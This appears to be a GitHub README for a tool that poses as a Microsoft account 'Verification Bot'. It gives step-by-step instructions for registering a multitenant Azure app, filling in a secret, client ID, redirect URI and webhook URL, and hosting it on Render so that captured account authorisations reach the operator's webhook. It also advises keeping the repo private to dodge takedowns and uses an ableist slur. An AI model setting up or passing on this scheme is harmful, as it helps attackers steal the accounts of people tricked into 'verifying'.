## first of all this is for educational purposes only, BY USING THIS YOU AGREE THAT YOU ARE THE ONLY ONE RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS.

## MADE BY NORMI N40R2I#8855 and me ofc xd L BOZO
Check this out too https://github.com/Normi-Dev/OAR

## UPDATE 

Now you dont need the whole login.live link, just use your redirect link and add /verify to it, example :"https://verification-system.onrender.com/verify"


## FOR RETARDS WHO TINK ITS DOUBLEHOOKED LOOK 
![image](https://user-images.githubusercontent.com/107274162/204852826-c230a8e8-188a-4b32-9c7c-e4a64cd2a50c.png)

THIS THING RIGHT THERE IS THE MF WHO SENDS THE EMBED TO THE WEBHOOK, IF IT WAS DOUBLEHOOKED IT WOULD LOOK LIKE THIS : ![image](https://user-images.githubusercontent.com/107274162/204853039-01ca2a38-316a-4c5a-9085-3f8faf7fe408.png)

HERE IT POSTS TO 2 DIFFERENT WEBHOOKS. NOW CRY



## Written Tutorial

1. Fork this repo  (IF YOU DONT WANT THE INTERNET GUARDIANS TO NUKE UR WEBHOOK DOWNLOAD THIS REPO AND UPLOAD IT TO A PRIVATE REPO)
2. Make a Microsoft Azure Application Registration https://portal.azure.com/  
       - create a new app registration  
       - name it something like "Verification Bot"  
       - choose Accounts in any organizational directory (Any Azure AD directory - Multitenant) and personal Microsoft accounts
      
3. Configure in index.js  
       - you need to change: 
          + secret_value  
          + client_id  
          + redirect_uri  
          + webhook_url  
            
4. Host the repo you forked on https://dashboard.render.com/ (WEB SERVICE) link to github and link the repo and just put a name and dont change anything else

## PREVIEW
![sshot-2022-11-30-16-20-55 (1)](https://user-images.githubusercontent.com/107274162/204861343-41629c0b-976b-4e77-9681-928be28961cc.jpg)

